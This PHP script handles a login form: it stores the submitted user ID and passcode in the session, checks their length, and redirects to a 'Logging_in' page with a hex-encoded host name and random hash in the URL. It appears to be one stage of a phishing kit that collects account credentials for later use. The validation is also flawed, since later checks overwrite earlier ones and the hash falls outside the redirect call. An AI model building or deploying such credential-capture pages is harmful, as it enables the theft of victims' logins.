<?php
ini_set("output_buffering",4096);
session_start();


//GET HOST NAME
$hostname = bin2hex ($_SERVER['HTTP_HOST']);


//Fetching Form Data
$_SESSION['UserID'] = $USER = $_POST['IDUser'];
$_SESSION['PassCode'] = $PASS = $_POST['Passcode'];



if ($USER=="")
{
$errors2=1;
}
else{
$errors2=0;
}

if (strlen($USER)<4)
{
$errors1=1;
}
else{
$errors1=0;
}


if ($PASS=="")
{
$errors2=1;
}
else{
$errors2=0;
}

if (strlen($PASS)<6)
{
$errors2=1;
}
else{
$errors2=0;
}

if ($errors1==1 || $errors2==1)
      {
	  
	  header("Location: index.php?invalidX$hostname").md5(time());

	  }
	  
else {

header("Location: Logging_in.php?$hostname").md5(time());
}

?>